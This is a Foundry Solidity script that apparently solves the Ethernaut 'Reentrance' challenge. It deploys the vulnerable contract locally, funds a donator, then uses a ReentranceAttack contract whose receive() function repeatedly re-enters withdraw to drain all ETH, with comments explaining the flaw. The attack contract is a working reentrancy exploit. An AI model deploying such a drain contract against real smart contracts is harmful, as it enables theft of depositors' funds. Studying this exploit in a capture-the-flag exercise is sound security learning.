// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract ReentranceSolution is Script {
    // $ forge script script/Reentrance.s.sol --tc ReentranceSolution -vvvv

    Reentrance reentranceInstance;
    ReentranceAttack attackContract;

    function run() external {
        // Deploy `Reentrance` contract
        reentranceInstance = new Reentrance();

        // Make a donation
        address donator = makeAddr("donator");
        vm.startPrank(donator);
        vm.deal(donator, 0.05 ether);
        console.log("Donator Balance:", reentranceInstance.balanceOf(donator));
        reentranceInstance.donate{value: 0.05 ether}(donator);
        console.log("Donator Balance:", reentranceInstance.balanceOf(donator));
        vm.stopPrank();

        // The attack will start from here and the attacker will be able to drain all the ETH in `Reentrance` contract.

        // - The contract has a `withdraw` function, but it sends funds before resetting the balance.
        // - If the attacker called `withdraw` function again after receiving his withdrawal immediately after receiving ETH, he could pass this check.
        // - The attacker will make a contract that has `receive` function, that will recall the `withdraw` function in `Reentrance` contract.
        // - So when the attacker withdraws his funds, he can re-withdraw again, since he will call withdraw before updating his balance.
        // - The attacker will drain all `Reentrance` ETH (donators funds), and make the attack successful.

        // Deploy the attack contract
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.deal(attacker, 0.1 ether);
        attackContract = new ReentranceAttack(address(reentranceInstance));

        // Start the attack
        console.log("------- ATTACK WILL HAPPEN ----------");
        console.log("Reentrance Balance:", address(reentranceInstance).balance);
        console.log("Attacker Balance:", address(attackContract).balance);
        attackContract.attack{value: 0.01 ether}();
        console.log("Reentrance Balance:", address(reentranceInstance).balance);
        console.log("Attacker Balance:", address(attackContract).balance);
        vm.stopPrank();

        // You can preview the logs in the terminal, you will find the reentrancy like a pyramid fallback
    }
}

contract ReentranceAttack {
    Reentrance reentranceInstance;
    uint256 attackerDonation;

    constructor(address payable target) public {
        reentranceInstance = Reentrance(target);
    }

    receive() external payable {
        withdraw();
    }

    function attack() public payable {
        attackerDonation = msg.value;
        reentranceInstance.donate{value: attackerDonation}(address(this));
        withdraw();
    }

    function withdraw() public {
        uint256 reentranceBalance = address(reentranceInstance).balance;
        // Check if the `Reentrance` contract has funds or not.
        bool isBalanceExist = reentranceBalance > 0;

        if (isBalanceExist) {
            // can only withdraw at most our initial balance per withdraw call
            // - If we donated 0.1 ETH, and the contract has 0.5 ETH we will call withdraw with 0.1 ETH
            // - If we donated 0.1 ETH, and the contract has 0.05 ETH we will call withdraw with 0.05 ETH
            uint256 amountToWithdraw = attackerDonation < reentranceBalance ? attackerDonation : reentranceBalance;
            reentranceInstance.withdraw(amountToWithdraw);
        }
    }
}
